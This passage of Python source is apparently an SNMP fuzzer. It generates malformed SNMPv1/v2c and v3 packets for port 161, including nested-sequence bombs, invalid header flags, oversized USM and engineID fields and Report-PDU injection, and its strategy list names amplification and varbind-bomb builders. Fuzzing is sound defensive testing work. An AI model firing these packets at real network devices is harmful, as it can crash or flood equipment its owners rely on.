    if variant == "deep_seq":
        inner = _null()
        for _ in range(1500):
            inner = _sequence(inner)
        vb = _sequence(_oid(_OID_SYSDESCR) + inner)
        return _clamp(_message_v1v2c(1, community, _std_pdu(_PDU_SET, _sequence(vb)))), 161
    if variant == "deep_varbind":
        inner = _varbind(_OID_SYSDESCR)
        for _ in range(800):
            inner = _sequence(inner)
        return _clamp(_message_v1v2c(1, community, _std_pdu(_PDU_GET, _sequence(inner)))), 161
    if variant == "alternating":
        inner = _null()
        for i in range(600):
            tag = _T_SEQUENCE if i % 2 == 0 else _PDU_GET
            inner = _tlv(tag, inner)
        return _clamp(_message_v1v2c(1, community, _std_pdu(_PDU_GET, _sequence(_sequence(_oid(_OID_SYSDESCR) + inner))))), 161
    # wide_then_deep
    inner = _null()
    for _ in range(500):
        inner = _sequence(inner + _null())
    vb = _sequence(_oid(_OID_SYSDESCR) + inner)
    return _clamp(_message_v1v2c(1, community, _std_pdu(_PDU_SET, _sequence(vb)))), 161


# ── SNMPv3 helpers ──────────────────────────────────────────────────────────
def _usm_params(engine_id=b"\x80\x00\x00\x09\x03", boots=0, etime=0,
                user=b"", auth=b"", priv=b"") -> bytes:
    """BER-serialized UsmSecurityParameters."""
    return _octet_string(_sequence(
        _octet_string(engine_id) + _integer(boots) + _integer(etime) +
        _octet_string(user) + _octet_string(auth) + _octet_string(priv)))


def _scoped_pdu(pdu: bytes, ctx_engine=b"\x80\x00\x00\x09\x03", ctx_name=b"") -> bytes:
    return _sequence(_octet_string(ctx_engine) + _octet_string(ctx_name) + pdu)


def _v3_message(header_data: bytes, sec_params: bytes, scoped: bytes) -> bytes:
    return _sequence(_integer(3) + header_data + sec_params + scoped)


def _v3_header(msg_id=None, max_size=65507, flags=b"\x04", sec_model=3) -> bytes:
    if msg_id is None:
        msg_id = _rid()
    return _sequence(_integer(msg_id) + _integer(max_size) +
                     _octet_string(flags) + _integer(sec_model))


# ── Strategy 12: SNMPv3 HeaderData malform ──────────────────────────────────
def _build_v3_header_malform():
    """SNMPv3 HeaderData / dispatcher abuse."""
    variant = random.choice([
        "invalid_flags", "all_flags", "unknown_secmodel", "maxsize_small",
        "maxsize_huge", "truncated_header", "scoped_choice_confusion", "msgid_overflow",
    ])
    pdu = _std_pdu(_PDU_GET, _varbindlist([_varbind(_OID_SYSDESCR)]))
    scoped = _scoped_pdu(pdu)
    usm = _usm_params(user=b"")
    if variant == "invalid_flags":
        # priv set, auth clear (0x02) = reserved/invalid combination
        return _v3_message(_v3_header(flags=b"\x02"), usm, scoped), 161
    if variant == "all_flags":
        return _v3_message(_v3_header(flags=b"\xFF"), usm, scoped), 161
    if variant == "unknown_secmodel":
        return _v3_message(_v3_header(sec_model=random.choice([0, 99, 0x7FFFFFFF])), usm, scoped), 161
    if variant == "maxsize_small":
        # msgMaxSize < 484 (RFC violation)
        return _v3_message(_v3_header(max_size=10), usm, scoped), 161
    if variant == "maxsize_huge":
        hdr = _sequence(_integer(_rid()) + _raw_integer(b"\x7F\xFF\xFF\xFF\xFF\xFF") +
                        _octet_string(b"\x04") + _integer(3))
        return _v3_message(hdr, usm, scoped), 161
    if variant == "truncated_header":
        hdr = bytes([_T_SEQUENCE, 0x40]) + _integer(_rid())  # claims 64, gives few
        return _v3_message(hdr, usm, scoped), 161
    if variant == "scoped_choice_confusion":
        # ScopedPduData should be plaintext SEQUENCE or encryptedPDU OCTET STRING;
        # send an encryptedPDU OCTET STRING where decryption is impossible
        enc = _octet_string(bytes(random.choices(range(256), k=200)))
        return _v3_message(_v3_header(flags=b"\x03"), usm, enc), 161
    # msgid_overflow: msgFlags octet string wrong size (SIZE(1) required)
    hdr = _sequence(_integer(_rid()) + _integer(65507) +
                    _octet_string(b"\x04\x04\x04\x04") + _integer(3))
    return _v3_message(hdr, usm, scoped), 161


# ── Strategy 13: USM parameter overflow ─────────────────────────────────────
def _build_usm_param_overflow():
    """USM UsmSecurityParameters abuse (RFC 3414/3411 size bounds)."""
    variant = random.choice([
        "username_over32", "engineid_oversize", "engineid_under5", "auth_oversize",
        "priv_oversize", "boots_overflow", "truncated_usm", "all_oversize",
    ])
    pdu = _std_pdu(_PDU_GET, _varbindlist([_varbind(_OID_SYSDESCR)]))
    scoped = _scoped_pdu(pdu)
    hdr = _v3_header(flags=b"\x01")  # authNoPriv
    if variant == "username_over32":
        # msgUserName SIZE(0..32) -> send 4000 bytes
        usm = _usm_params(user=bytes(random.choices(range(65, 91), k=4000)))
        return _clamp(_v3_message(hdr, usm, scoped)), 161
    if variant == "engineid_oversize":
        # snmpEngineID SIZE(5..32) -> send 4000 bytes
        usm = _usm_params(engine_id=bytes(random.choices(range(256), k=4000)))
        return _clamp(_v3_message(hdr, usm, scoped)), 161
    if variant == "engineid_under5":
        usm = _usm_params(engine_id=b"\x01")  # too short
        return _v3_message(hdr, usm, scoped), 161
    if variant == "auth_oversize":
        # auth params should be 12 bytes for HMAC-MD5/SHA-96
        usm = _usm_params(user=b"admin", auth=bytes(random.choices(range(256), k=2000)))
        return _clamp(_v3_message(hdr, usm, scoped)), 161
    if variant == "priv_oversize":
        # priv params should be 8 bytes (DES/AES salt)
        usm = _usm_params(user=b"admin", auth=b"\x00" * 12,
                          priv=bytes(random.choices(range(256), k=2000)))
        return _clamp(_v3_message(_v3_header(flags=b"\x03"), usm, scoped)), 161
    if variant == "boots_overflow":
        usm = _octet_string(_sequence(
            _octet_string(b"\x80\x00\x00\x09\x03") +
            _raw_integer(b"\x7F\xFF\xFF\xFF\xFF\xFF") +   # engineBoots > 2^31
            _raw_integer(b"\x7F\xFF\xFF\xFF\xFF\xFF") +   # engineTime > 2^31
            _octet_string(b"admin") + _octet_string(b"") + _octet_string(b"")))
        return _v3_message(hdr, usm, scoped), 161
    if variant == "truncated_usm":
        # msgSecurityParameters OCTET STRING wraps a SEQUENCE that ends early
        bad = _octet_string(bytes([_T_SEQUENCE, 0x40]) + _octet_string(b"\x80\x00\x00\x09\x03"))
        return _v3_message(hdr, bad, scoped), 161
    # all_oversize
    usm = _usm_params(engine_id=bytes(random.choices(range(256), k=1000)),
                      user=bytes(random.choices(range(65, 91), k=1000)),
                      auth=bytes(1000), priv=bytes(1000))
    return _clamp(_v3_message(_v3_header(flags=b"\x03"), usm, scoped)), 161


# ── Strategy 14: engineID discovery + ScopedPDU abuse (RFC 5343) ────────────
def _build_engineid_scopedpdu_abuse():
    """Empty-engineID discovery floods + ScopedPDU context-field abuse."""
    variant = random.choice([
        "discovery", "engineid_format_byte", "ctx_engine_oversize",
        "ctx_name_oversize", "ctx_name_nul", "report_injection", "scoped_len_mismatch",
    ])
    pdu = _std_pdu(_PDU_GET, _varbindlist([_varbind(_OID_SNMPENGINEID)]))
    if variant == "discovery":
        # RFC 5343 discovery: empty engineID + empty user, noAuthNoPriv
        usm = _usm_params(engine_id=b"", user=b"")
        scoped = _scoped_pdu(pdu, ctx_engine=b"")
        return _v3_message(_v3_header(flags=b"\x04"), usm, scoped), 161
    if variant == "engineid_format_byte":
        # format byte (5th octet) invalid: 0x00 / 0x7F / 0xFF
        fmt = random.choice([0x00, 0x7F, 0xFF])
        eid = bytes([0x80, 0x00, 0x00, 0x09, fmt]) + bytes(random.choices(range(256), k=10))
        usm = _usm_params(engine_id=eid, user=b"")
        scoped = _scoped_pdu(pdu, ctx_engine=eid)
        return _v3_message(_v3_header(flags=b"\x04"), usm, scoped), 161
    if variant == "ctx_engine_oversize":
        big = bytes(random.choices(range(256), k=20000))
        scoped = _scoped_pdu(pdu, ctx_engine=big)
        usm = _usm_params(user=b"")
        return _clamp(_v3_message(_v3_header(flags=b"\x04"), usm, scoped)), 161
    if variant == "ctx_name_oversize":
        big = bytes(random.choices(range(65, 91), k=20000))
        scoped = _scoped_pdu(pdu, ctx_name=big)
        usm = _usm_params(user=b"")
        return _clamp(_v3_message(_v3_header(flags=b"\x04"), usm, scoped)), 161
    if variant == "ctx_name_nul":
        scoped = _scoped_pdu(pdu, ctx_name=b"ctx\x00\x00name\x00")
        usm = _usm_params(user=b"")
        return _v3_message(_v3_header(flags=b"\x04"), usm, scoped), 161
    if variant == "report_injection":
        # client sends a Report-PDU [0xA8] (engine-to-engine only)
        rep = _std_pdu(_PDU_REPORT, _varbindlist([_varbind(_OID_SNMPENGINEID, _integer(1))]))
        scoped = _scoped_pdu(rep)
        usm = _usm_params(user=b"")
        return _v3_message(_v3_header(flags=b"\x00"), usm, scoped), 161
    # scoped_len_mismatch: scopedPDU SEQUENCE declares wrong length
    inner = _octet_string(b"\x80\x00\x00\x09\x03") + _octet_string(b"") + pdu
    bad_scoped = bytes([_T_SEQUENCE]) + _ber_len(len(inner) + 1000) + inner
    usm = _usm_params(user=b"")
    return _v3_message(_v3_header(flags=b"\x04"), usm, bad_scoped), 161


# ── Dispatcher ──────────────────────────────────────────────────────────────
_BUILDERS = {
    "ber_length_overflow":        _build_ber_length_overflow,
    "ber_indefinite_nonminimal":  _build_ber_indefinite_nonminimal,
    "truncated_tlv":              _build_truncated_tlv,
    "version_pdu_confusion":      _build_version_pdu_confusion,
    "getbulk_amplification":      _build_getbulk_amplification,
    "oid_encoding_attack":        _build_oid_encoding_attack,
    "varbind_bomb":               _build_varbind_bomb,
    "trap_v1_malform":            _build_trap_v1_malform,
    "integer_field_overflow":     _build_integer_field_overflow,
    "community_overflow":         _build_community_overflow,
    "nested_sequence_bomb":       _build_nested_sequence_bomb,
    "v3_header_malform":          _build_v3_header_malform,
    "usm_param_overflow":         _build_usm_param_overflow,
    "engineid_scopedpdu_abuse":   _build_engineid_scopedpdu_abuse,
}


_SNMP_OVERRIDE_CAPABLE = frozenset(["ber_indefinite_nonminimal"])

def build_snmp_payload(strategy: str, payload_override=None):
    """Return (payload_bytes, dst_port) for the given strategy."""
    builder = _BUILDERS.get(strategy)
    if builder is None:
        builder = _build_ber_length_overflow
    if payload_override is not None and strategy in _SNMP_OVERRIDE_CAPABLE:
        payload, dst_port = builder(payload_override=payload_override)
    else:
        payload, dst_port = builder()
    return _clamp(payload), dst_port


# ── Mutator class ──────────────────────────────────────────────────────────
class SnmpMutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = SNMP_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return SNMP_WEIGHTS

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_snmp_payload(strategy, payload_override=payload_override)
        return payload, strategy, dst_port

